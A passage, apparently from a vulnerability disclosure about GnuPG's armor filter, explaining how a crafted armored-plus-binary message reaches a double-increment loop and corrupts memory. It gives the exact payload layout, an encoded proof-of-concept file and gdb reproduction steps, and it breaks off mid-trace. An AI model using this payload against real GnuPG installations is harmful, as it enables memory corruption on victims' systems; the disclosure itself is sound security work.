r:#FFA657">afx</span><span style=3D"color:#E6EDF3">, IOBUF </span><span sty=
le=3D"color:#FFA657">a</span><span style=3D"color:#E6EDF3"> ) &#123;</span>=
</span>
<span class=3D"line"><span style=3D"color:#8B949E">    // ...</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">    /* read the first li=
ne to see whether this is armored data */</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    len </span><span sty=
le=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> afx->buffer_l=
en </span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A=
8FF"> iobuf_read_line</span><span style=3D"color:#E6EDF3">( a, </span><span=
 style=3D"color:#FF7B72">&#x26;</span><span style=3D"color:#E6EDF3">afx->bu=
ffer,</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">					     &#x26;</span><=
span style=3D"color:#E6EDF3">afx->buffer_size, </span><span style=3D"color:=
#FF7B72">&#x26;</span><span style=3D"color:#E6EDF3">maxlen );</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">    // ...</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    else</span><span sty=
le=3D"color:#FF7B72"> if</span><span style=3D"color:#E6EDF3"> (len </span><=
span style=3D"color:#FF7B72">>=3D</span><span style=3D"color:#79C0FF"> 2</s=
pan><span style=3D"color:#FF7B72"> &#x26;&#x26;</span><span style=3D"color:=
#FF7B72"> !</span><span style=3D"color:#D2A8FF">is_armored</span><span styl=
e=3D"color:#E6EDF3">(line)) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        afx->inp_checked=
 </span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0F=
F"> 1</span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        afx->inp_bypass =
</span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF=
"> 1</span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#79C0FF"> 0</span><span style=3D"color:#E6EDF3">;</span><=
/span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125;  </span></spa=
n>
<span class=3D"line"><span style=3D"color:#8B949E">    // ...</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span></co=
de></pre><!----> <p>So if <code>is_armored</code> returns true, the conditi=
on above fails, and if it is false, <code>use_armor_filter</code> returns f=
alse, and the armor filter does not get pushed in the first place.</p> <p>W=
ith ordinary or basic malformed inputs, the root cause bug seems unreachabl=
e. However, a specifically crafted payload can manipulate the state of the =
parser to trigger it anyway: We start with valid ASCII-armored data in a =
=E2=80=9CBEGIN PGP MESSAGE=E2=80=9D and then without an =E2=80=9CEND PGP ME=
SSAGE=E2=80=9D (i.e. popping the filter) we follow it up with a binary payl=
oad at a specific location described in the following. This will lead to us=
 reentering the <code>check_input</code> function.</p> <p>The function that=
 contains the snippet above, <code>check_input</code>, is only called if <c=
ode>afx->inp_checked =3D 0</code>. GnuPG uses this flag to store whether it=
 has already determined the input format. However, the <code>if (checkcrc)<=
/code> branch in <code>radix64_read</code> resets it under certain conditio=
ns. For context: PGP messages optionally contain an error correction code (=
CRC) at the end. Note, we believe that <em>GnuPG</em> resets <code>afx->inp=
_checked</code> here assuming that the CRC must be the end of the message, =
always followed by the =E2=80=9CEND PGP MESSAGE=E2=80=9D marker. However, t=
he filter for this current message is not popped yet.</p> <!----><pre class=
=3D"shiki github-dark-default" style=3D"background-color:#0d1117;color:#e6e=
df3" tabindex=3D"0"><code><span class=3D"line"><span style=3D"color:#FF7B72=
">static</span><span style=3D"color:#FF7B72"> int</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">radix64_read</span><span=
 style=3D"color:#E6EDF3">(</span><span style=3D"color:#79C0FF">armor_filter=
_context_t</span><span style=3D"color:#FF7B72"> *</span><span style=3D"colo=
r:#FFA657">afx</span><span style=3D"color:#E6EDF3">, IOBUF </span><span sty=
le=3D"color:#FFA657">a</span><span style=3D"color:#E6EDF3">, </span><span s=
tyle=3D"color:#FF7B72">size_t</span><span style=3D"color:#FF7B72"> *</span>=
<span style=3D"color:#FFA657">retn</span><span style=3D"color:#E6EDF3">,</s=
pan></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">             byte </span=
><span style=3D"color:#FF7B72">*</span><span style=3D"color:#FFA657">buf</s=
pan><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#FF7B72">si=
ze_t</span><span style=3D"color:#FFA657"> size</span><span style=3D"color:#=
E6EDF3">) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">    // ...</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
=3D"color:#E6EDF3"> (checkcrc) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">        gcry_md_final</s=
pan><span style=3D"color:#E6EDF3">(afx->crc_md);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        afx->any_data </=
span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF">=
 1</span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        afx->inp_checked=
 </span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0F=
F"> 0</span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        afx->faked </spa=
n><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> 0<=
/span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">    // ...</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span></co=
de></pre><!----> <p>Visually, this check happens here, the last =E2=80=99=
=3D=E2=80=99 character after the base64 encoded data marks the start of the=
 CRC checksum data, in the following we refer to this position as <code>buf=
fer_pos</code>.</p> <!----><pre class=3D"shiki github-dark-default" style=
=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span clas=
s=3D"line"><span>=3D=3D=3D=3D=3DBEGIN [type]=3D=3D=3D=3D=3D</span></span>
<span class=3D"line"><span>BASE64BASE64BASE64</span></span>
<span class=3D"line"><span>BASE64BASE64BASE64</span></span>
<span class=3D"line"><span>BASE64BASE64BASE64</span></span>
<span class=3D"line"><span>&#123;buffer_pos&#125;=3DCRC</span></span>
<span class=3D"line"><span>=3D=3D=3D=3D=3DEND [type]=3D=3D=3D=3D=3D</span><=
/span></code></pre><!----> <p>At this point the condition is set, and only =
the end mark (<code>=3D</code>), the (optional) CRC, and the newline are co=
nsumed. After that, the underflow handler returns, leaving in the buffer:</=
p> <!----><pre class=3D"shiki github-dark-default" style=3D"background-colo=
r:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=3D"line"><span>=
=3D=3D=3D=3D=3DEND [type]=3D=3D=3D=3D=3D</span></span></code></pre><!----> =
<p>Which gets checked as armor, and due to it being a valid armor line, the=
 input re-check does nothing unusual. However, we can construct a message l=
ike this:</p> <!----><pre class=3D"shiki github-dark-default" style=3D"back=
ground-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=3D"lin=
e"><span>=3D=3D=3D=3D=3DBEGIN [type]=3D=3D=3D=3D=3D</span></span>
<span class=3D"line"><span>BASE64BASE64BASE64</span></span>
<span class=3D"line"><span>BASE64BASE64BASE64</span></span>
<span class=3D"line"><span>BASE64BASE64BASE64</span></span>
<span class=3D"line"><span>&#123;buffer_pos&#125;=3DCRC</span></span>
<span class=3D"line"><span>[binary message]</span></span></code></pre><!---=
-> <p>Which, after reading the base64 and CRC, gets an underflow on the fol=
lowing buffer with <code>afx->inp_checked =3D=3D 0</code>:</p> <!----><pre =
class=3D"shiki github-dark-default" style=3D"background-color:#0d1117;color=
:#e6edf3" tabindex=3D"0"><code><span class=3D"line"><span>[binary message]<=
/span></span></code></pre><!----> <p>And this, when fulfilling any of the c=
onditions in <code>check_input</code>, gets detected as a binary message, a=
nd the at-first-sight =E2=80=9Cdead=E2=80=9D <code>afx->inp_bypass</code> i=
n <code>armor_filter</code> branch suddenly gets executed. The <code>contro=
l</code> code <code>IOBUFCTRL_UNDERFLOW</code> is the regular control code =
that the armor filter is invoked with, processing data chunk-by-chunk.</p> =
<p>This alone is still not enough for exploitation, though: Directly after =
the call to <code>check_input</code>, a branch fills the <code>afx->buffer<=
/code>:</p> <!----><pre class=3D"shiki github-dark-default" style=3D"backgr=
ound-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=3D"line"=
><span style=3D"color:#E6EDF3">rc </span><span style=3D"color:#FF7B72">=3D<=
/span><span style=3D"color:#D2A8FF"> check_input</span><span style=3D"color=
:#E6EDF3">(afx, a);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">if</span><span style=3D"=
color:#E6EDF3"> (afx</span><span style=3D"color:#FF7B72">-></span><span sty=
le=3D"color:#E6EDF3">inp_bypass) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    for</span><span styl=
e=3D"color:#E6EDF3"> (n </span><span style=3D"color:#FF7B72">=3D</span><spa=
n style=3D"color:#79C0FF"> 0</span><span style=3D"color:#E6EDF3">; n </span=
><span style=3D"color:#FF7B72">&#x3C;</span><span style=3D"color:#E6EDF3"> =
size </span><span style=3D"color:#FF7B72">&#x26;&#x26;</span><span style=3D=
"color:#E6EDF3"> afx->buffer_pos </span><span style=3D"color:#FF7B72">&#x3C=
;</span><span style=3D"color:#E6EDF3"> afx->buffer_len;)</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">        buf</span><span =
style=3D"color:#E6EDF3">[n</span><span style=3D"color:#FF7B72">++</span><sp=
an style=3D"color:#E6EDF3">] </span><span style=3D"color:#FF7B72">=3D</span=
><span style=3D"color:#E6EDF3"> afx->buffer[afx->buffer_pos</span><span sty=
le=3D"color:#FF7B72">++</span><span style=3D"color:#E6EDF3">];</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
=3D"color:#E6EDF3"> (afx->buffer_pos </span><span style=3D"color:#FF7B72">>=
=3D</span><span style=3D"color:#E6EDF3"> afx->buffer_len)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        afx->buffer_len =
</span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF=
"> 0</span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
=3D"color:#E6EDF3"> (</span><span style=3D"color:#FF7B72">!</span><span sty=
le=3D"color:#E6EDF3">n)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        rc </span><span =
style=3D"color:#FF7B72">=3D</span><span style=3D"color:#FF7B72"> -</span><s=
pan style=3D"color:#79C0FF">1</span><span style=3D"color:#E6EDF3">;</span><=
/span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span></co=
de></pre><!----> <p>This code is very similar to the double-increment code,=
 with the small change that it does not have the double-increment bug, so w=
e actively have to <em>avoid</em> it consuming the entire buffer, for explo=
itation.</p> <p>We can only write to the buffer once, as it contains the bu=
ffered part of the current line that was read by <code>iobuf_read_line</cod=
e>. This function is always called with a limit <code>&lt;=3D MAX_LINELEN</=
code>, which in production builds is 20000.</p> <p>However, since a consume=
r of the iobuf pipeline cannot know a size beforehand, a complete fill of t=
he iobuf buffer is requested, which is defined as <code>DEFAULT_IOBUF_BUFFE=
R_SIZE</code>, in production builds 65536.</p> <p>This, again, seems like i=
t would not be possible to exploit, but can be bypassed with a carefully co=
nstructed input: Our payload currently consists of an armored message, foll=
owed by a binary message. By making the armored message parse into <code>> =
DEFAULT_IOBUF_BUFFER_SIZE</code> bytes output, and including a message that=
 claims a size of <code>&lt; MAX_LINELEN</code> in its header, the 2nd <cod=
e>IOBUFCTRL_UNDERFLOW</code> will request a size <code>&lt; MAX_LINELEN</co=
de> that will get processed by the single-increment code, leaving unconsume=
d bytes in the buffer for the 3rd <code>IOBUFCTRL_UNDERFLOW</code> call tha=
t will get processed by the double-increment code (<code>afx->inp_checked</=
code> is again true at this point).</p> <p>In summary, our payload is struc=
tured as follows:</p> <!----><pre class=3D"shiki github-dark-default" style=
=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span clas=
s=3D"line"><span>[ASCII "=3D=3D=3D=3D=3DBEGIN PGP MESSAGE=3D=3D=3D=3D=3D"] =
[ASCII "&#92;n"]</span></span>
<span class=3D"line"><span>[Base64 [65536 bytes of [Packet len=3D67000]]] [=
ASCII "&#92;n"]</span></span>
<span class=3D"line"><span>[ASCII "=3D"] [ASCII "&#92;n"]</span></span>
<span class=3D"line"><span>[binary payload]</span></span></code></pre><!---=
-> <p>The parser will:</p> <ul><li>Check for armor <ul><li>Find armor</li> =
<li>Push armor filter</li></ul></li></ul> <p>The 1st <code>IOBUFCTRL_UNDERF=
LOW</code> on the armor filter will:</p> <ul><li>See a request for 65536 by=
tes</li> <li>Do <code>check_input</code> as <code>afx->inp_checked</code> i=
s 0 <ul><li>Consume <code>[ASCII "=3D=3D=3D=3D=3DBEGIN PGP MESSAGE=3D=3D=3D=
=3D=3D" "\n"]</code> <ul><li>Set <code>afx->inp_checked</code> to 1</li> <l=
i>Set <code>afx->inp_bypass</code> to 0</li></ul></li></ul></li> <li>Do <co=
de>radix64_read</code> as <code>afx->inp_bypass</code> is 0 <ul><li>Consume=
 65536 bytes of <code>[Base64 [65536 bytes of [Packet len=3D67000]]] [ASCII=
 "\n"]</code></li> <li>Consume <code>[ASCII "=3D"] [ASCII "\n"]</code> (we =
do not set the optional CRC) <ul><li>Set <code>afx->inp_checked</code> to 0=
</li></ul></li></ul></li> <li>Return with <code>*ret_len=3D65536</code></li=
></ul> <p>The parser now runs and sees a packet with len=3D67000, and 65536=
 bytes available, so it underflows (<code>IOBUFCTRL_UNDERFLOW</code>) for 1=
464 bytes.</p> <p>The 2nd <code>IOBUFCTRL_UNDERFLOW</code> will:</p> <ul><l=
i>See a request for 1464 bytes</li> <li>Do <code>check_input</code> as <cod=
e>afx->inp_checked</code> is 0 <ul><li>See no armor</li> <li>Set <code>afx-=
>inp_checked</code> to 1</li> <li>Set <code>afx->inp_bypass</code> to 1</li=
></ul></li> <li>Read and return 1464 bytes from <code>afx->buffer</code> wi=
th the single-increment code</li> <li>Return with <code>*ret_len=3D1464</co=
de></li></ul> <p>The 3rd <code>IOBUFCTRL_UNDERFLOW</code> will:</p> <ul><li=
>See a request for n bytes</li> <li>Go into the <code>&amp;&amp; afx->inp_b=
ypass</code> branch</li> <li>Read and return n bytes from <code>afx->buffer=
</code> with the double-increment code</li> <li>Return with <code>*ret_len=
=3Dn + (1 - (n % 2))</code></li></ul> <p>With this specific setup, the unde=
rflow will report a read value/<code>ret_len</code> higher than the request=
ed value. This state should never happen, and various places in the code, i=
ncluding memory-safety relevant guards, assume (but not assert) that this w=
ill never be the case. This triggers various (buffer size/position related)=
 integer underflows and direct memory safety issues, for example (line comm=
ents added by us):</p> <!----><pre class=3D"shiki github-dark-default" styl=
e=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span cla=
ss=3D"line"><span style=3D"color:#E6EDF3">needed </span><span style=3D"colo=
r:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> size </span><span style=
=3D"color:#FF7B72">&#x3C;</span><span style=3D"color:#E6EDF3"> a</span><spa=
n style=3D"color:#FF7B72">-></span><span style=3D"color:#E6EDF3">size </spa=
n><span style=3D"color:#FF7B72">?</span><span style=3D"color:#E6EDF3"> size=
 </span><span style=3D"color:#FF7B72">:</span><span style=3D"color:#E6EDF3"=
> a</span><span style=3D"color:#FF7B72">-></span><span style=3D"color:#E6ED=
F3">size;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">c </span><span style=3D"=
color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> iobuf_read</span><s=
pan style=3D"color:#E6EDF3">(chain, p, needed);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">if</span><span style=3D"=
color:#E6EDF3"> (c </span><span style=3D"color:#FF7B72">&#x3C;</span><span =
style=3D"color:#E6EDF3"> needed) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  if</span><span style=
=3D"color:#E6EDF3"> (c </span><span style=3D"color:#FF7B72">=3D=3D</span><s=
pan style=3D"color:#FF7B72"> -</span><span style=3D"color:#79C0FF">1</span>=
<span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    c </span><span style=
=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> 0</span><span s=
tyle=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  log_error</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  (</span><span style=3D=
"color:#A5D6FF">"block_filter </span><span style=3D"color:#FF7B72">%p</span=
><span style=3D"color:#A5D6FF">: read error (size=3D</span><span style=3D"c=
olor:#FF7B72">%lu</span><span style=3D"color:#A5D6FF">,a->size=3D</span><sp=
an style=3D"color:#FF7B72">%lu</span><span style=3D"color:#A5D6FF">)</span>=
<span style=3D"color:#FF7B72">&#92;n</span><span style=3D"color:#A5D6FF">"<=
/span><span style=3D"color:#E6EDF3">,</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">   a, (ulong) size </spa=
n><span style=3D"color:#FF7B72">+</span><span style=3D"color:#E6EDF3"> c, (=
ulong) a->size </span><span style=3D"color:#FF7B72">+</span><span style=3D"=
color:#E6EDF3"> c);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  rc </span><span style=
=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> GPG_ERR_BAD_DAT=
A;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125; </span><span styl=
e=3D"color:#FF7B72">else</span><span style=3D"color:#E6EDF3"> &#123;</span>=
</span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  size </span><span styl=
e=3D"color:#FF7B72">-=3D</span><span style=3D"color:#E6EDF3"> c;</span><spa=
n style=3D"color:#8B949E"> // write buffer offset underflow</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  a->size </span><span s=
tyle=3D"color:#FF7B72">-=3D</span><span style=3D"color:#E6EDF3"> c;</span><=
span style=3D"color:#8B949E"> // read buffer offset underflow</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  p </span><span style=
=3D"color:#FF7B72">+=3D</span><span style=3D"color:#E6EDF3"> c;</span></spa=
n>
<span class=3D"line"><span style=3D"color:#E6EDF3">  n </span><span style=
=3D"color:#FF7B72">+=3D</span><span style=3D"color:#E6EDF3"> c;</span></spa=
n>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span></co=
de></pre><!----> <!----><pre class=3D"shiki github-dark-default" style=3D"b=
ackground-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=3D"=
line"><span style=3D"color:#FF7B72">size_t</span><span style=3D"color:#E6ED=
F3"> temp_size </span><span style=3D"color:#FF7B72">=3D</span><span style=
=3D"color:#D2A8FF"> iobuf_set_buffer_size</span><span style=3D"color:#E6EDF=
3">(</span><span style=3D"color:#79C0FF">0</span><span style=3D"color:#E6ED=
F3">) </span><span style=3D"color:#FF7B72">*</span><span style=3D"color:#79=
C0FF"> 1024</span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">byte </span><span style=
=3D"color:#FF7B72">*</span><span style=3D"color:#E6EDF3">buffer </span><spa=
n style=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> xmalloc<=
/span><span style=3D"color:#E6EDF3">(temp_size);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">int</span><span style=3D=
"color:#E6EDF3"> ret;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">while</span><span style=
=3D"color:#E6EDF3"> ((ret </span><span style=3D"color:#FF7B72">=3D</span><s=
pan style=3D"color:#D2A8FF"> iobuf_read</span><span style=3D"color:#E6EDF3"=
>(fp, buffer, temp_size)) </span><span style=3D"color:#FF7B72">!=3D</span><=
span style=3D"color:#FF7B72"> -</span><span style=3D"color:#79C0FF">1</span=
><span style=3D"color:#E6EDF3">) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
=3D"color:#E6EDF3"> (md)</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">        gcry_md_write</s=
pan><span style=3D"color:#E6EDF3">(md, buffer, ret);</span><span style=3D"c=
olor:#8B949E"> // heap buffer overread</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span></co=
de></pre><!----> <!----><pre class=3D"shiki github-dark-default" style=3D"b=
ackground-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=3D"=
line"><span style=3D"color:#E6EDF3">ret </span><span style=3D"color:#FF7B72=
">=3D</span><span style=3D"color:#D2A8FF"> iobuf_read</span><span style=3D"=
color:#E6EDF3">(stream, </span><span style=3D"color:#FF7B72">&#x26;</span><=
span style=3D"color:#FFA657">buffer</span><span style=3D"color:#E6EDF3">[nr=
ead], curr);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">if</span><span style=3D"=
color:#E6EDF3"> (ret </span><span style=3D"color:#FF7B72">=3D=3D</span><spa=
n style=3D"color:#FF7B72"> -</span><span style=3D"color:#79C0FF">1</span><s=
pan style=3D"color:#E6EDF3">) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    dfx->eof_seen </span=
><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> 3</=
span><span style=3D"color:#E6EDF3">;</span><span style=3D"color:#8B949E"> /=
* Premature EOF. */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    break</span><span st=
yle=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">nread </span><span style=
=3D"color:#FF7B72">+=3D</span><span style=3D"color:#E6EDF3"> ret;</span></s=
pan>
<span class=3D"line"><span style=3D"color:#E6EDF3">dfx</span><span style=3D=
"color:#FF7B72">-></span><span style=3D"color:#E6EDF3">length </span><span =
style=3D"color:#FF7B72">-=3D</span><span style=3D"color:#E6EDF3"> ret;</spa=
n><span style=3D"color:#8B949E"> // read buffer offset underflow</span></sp=
an></code></pre><!----> <!----><pre class=3D"shiki github-dark-default" sty=
le=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span cl=
ass=3D"line"><span style=3D"color:#E6EDF3">temp </span><span style=3D"color=
:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> xmalloc</span><span styl=
e=3D"color:#E6EDF3">(temp_size);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">while</span><span style=
=3D"color:#E6EDF3"> (</span><span style=3D"color:#79C0FF">1</span><span sty=
le=3D"color:#E6EDF3">) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  nread </span><span sty=
le=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> iobuf_read</s=
pan><span style=3D"color:#E6EDF3">(source, temp, temp_size);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  if</span><span style=
=3D"color:#E6EDF3"> (nread </span><span style=3D"color:#FF7B72">=3D=3D</spa=
n><span style=3D"color:#FF7B72"> -</span><span style=3D"color:#79C0FF">1</s=
pan><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">    /* EOF.  */</span></=
span>
<span class=3D"line"><span style=3D"color:#FF7B72">    break</span><span st=
yle=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  if</span><span style=
=3D"color:#E6EDF3"> (nread </span><span style=3D"color:#FF7B72">></span><sp=
an style=3D"color:#E6EDF3"> max_read)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    max_read </span><spa=
n style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> nread;</=
span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  err </span><span style=
=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> iobuf_write</sp=
an><span style=3D"color:#E6EDF3">(dest, temp, nread);</span><span style=3D"=
color:#8B949E"> // buffer overread</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  if</span><span style=
=3D"color:#E6EDF3"> (err)</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    break</span><span st=
yle=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  nwrote </span><span st=
yle=3D"color:#FF7B72">+=3D</span><span style=3D"color:#E6EDF3"> nread;</spa=
n></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#8B949E">/* Burn the buffer.  */<=
/span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">if</span><span style=3D"=
color:#E6EDF3"> (max_read)</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">  wipememory</span><span=
 style=3D"color:#E6EDF3">(temp, max_read);</span><span style=3D"color:#8B94=
9E"> // buffer overflow</span></span></code></pre><!----> <p>Those are just=
 a few obvious examples, but due to GnuPG=E2=80=99s entire iobuf architectu=
re relying on the fact that the return size should never be bigger than the=
 requested size, state corruption cascades throughout the entire program. F=
rom here it is a challenge in memory corruption exploitation with a very la=
rge space of reachable primitives.</p> <h2>Detailed steps to reproduce</h2>=
 <h3>Scenario</h3> <p>Mallory sends Alice a message, or Mallory intercepts =
an untrusted message between Alice and Bob. The result of the operation and=
 the integrity of the system used is now compromised.</p> <h3>Procedure</h3=
> <p>A very basic PoC demonstrating that the faulty double-increment code i=
s reachable in production builds of GnuPG is provided:</p> <!----><pre clas=
s=3D"shiki github-dark-default" style=3D"background-color:#0d1117;color:#e6=
edf3" tabindex=3D"0"><code><span class=3D"line"><span>cd $(mktemp -d)</span=
></span>
<span class=3D"line"><span>curl -O https://www.gnupg.org/ftp/gcrypt/gnupg/g=
nupg-2.4.8.tar.bz2</span></span>
<span class=3D"line"><span>tar xf gnupg-2.4.8.tar.bz2</span></span>
<span class=3D"line"><span>cd gnupg-2.4.8/</span></span>
<span class=3D"line"><span>mkdir build; (cd build; CFLAGS=3D"-g -O0" ../con=
figure; make)</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>(base64 -d | gunzip | gunzip > poc) &#x3C;&#x3C;=
=3D=3D=3D</span></span>
<span class=3D"line"><span>H4sIAAAAAAACA5Pv5mCo1tqewcT89oIhX5ODQNvFG+c0t5lL=
+yVsPMbqKcC5/QPLsXnN3e4C0j73</span></span>
<span class=3D"line"><span>sv+fCfc5t7r47S9D37tTTtXsPv910q26FfNV3ff0PV5cOe3q=
Vk1pl58TG0YBheDAdPHlEXwMZIPd</span></span>
<span class=3D"line"><span>wnEMQwp8SL8n1flI9v57FgYAcfj03ZICAAA=3D</span></s=
pan>
<span class=3D"line"><span>=3D=3D=3D</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>gdb </span></span>
<span class=3D"line"><span>  -ex "b armor.c:$(grep -n 'buffer_len; n++' g10=
/armor.c | cut -d: -f1)" </span></span>
<span class=3D"line"><span>  -ex r -ex 'display n' -ex n -ex n -ex n -ex n =
-ex n </span></span>
<span class=3D"line"><span>  --args ./build/bin/gpg -o- --dearmor poc</span=
></span></code></pre><!----> <p>Which prints:</p> <!----><pre class=3D"shik=
i github-dark-default" style=3D"background-color:#0d1117;color:#e6edf3" tab=
index=3D"0"><code><span class=3D"line"><span>GNU gdb (GDB) 16.3</span></spa=
n>
<span class=3D"line"><span>[snip]</span></span>
<span class=3D"line"><span>Reading symbols from ./build/bin/gpg...</span></=
span>
<span class=3D"line"><span>Breakpoint 1 at 0x450550: file ../../g10/armor.c=
, line 1305.</span></span>
<span class=3D"line"><span>Starting program: /tmp/poc/gnupg-2.4.8/build/bin=
/gpg -o- --dearmor poc</span></span>
<span class=3D"line"><span>[Thread debugging using libthread_db enabled]</s=
pan></span>
<span class=3D"line"><span>Using host libthread_db library "/nix/store/8p33=
is69mjdw3bi1wmi8v2zpsxir8nwd-glibc-2.40-66/lib/libthread_db.so.1".</span></=
span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>Breakpoint 1, armor_filter (opaque=3D0x573be0, c=
ontrol=3D3, a=3D0x5744f0, buf=3D0x58da20 "", ret_len=3D0x7fffffff4208) at .=
./../g10/armor.c:1305</span></span>
<span class=3D"line"><span>1305                for(; n &#x3C; size &#x26;&#=
x26; afx->buffer_pos &#x3C; afx->buffer_len; n++ )</span></span>
<span class=3D"line"><span>1: n =3D 0</span></span>
<span class=3D"line"><span>1306                    buf[n++] =3D afx->buffer=
[afx->buffer_pos++];</span></span>
<span class=3D"line"><span>1: n =3D 0</span></span>
<span class=3D"line"><span>1305                for(; n &#x3C; size &#x26;&#=
x26; afx->buffer_pos &#x3C; afx->buffer_len; n++ )</span></span>
<span class=3D"line"><span>1: n =3D 1</span></span>
<span class=3D"line"><span>1306                    buf[n++] =3D afx->buffer=
[afx->buffer_pos++];</span></span>
<span class=3D"line"><span>1: n =3D 2</span></span>
<span class=3D"line"><span>1305                for(; n &#x3C; size &#x26;&#=
x26; afx->buffer_pos &#x3C; afx->buffer_len; n++ )</span></span>
<span class=3D"line"><span>1: n =3D 3</span></span>
<span class=3D"line"><span>1306                    buf[n++] =3D afx->buffer=
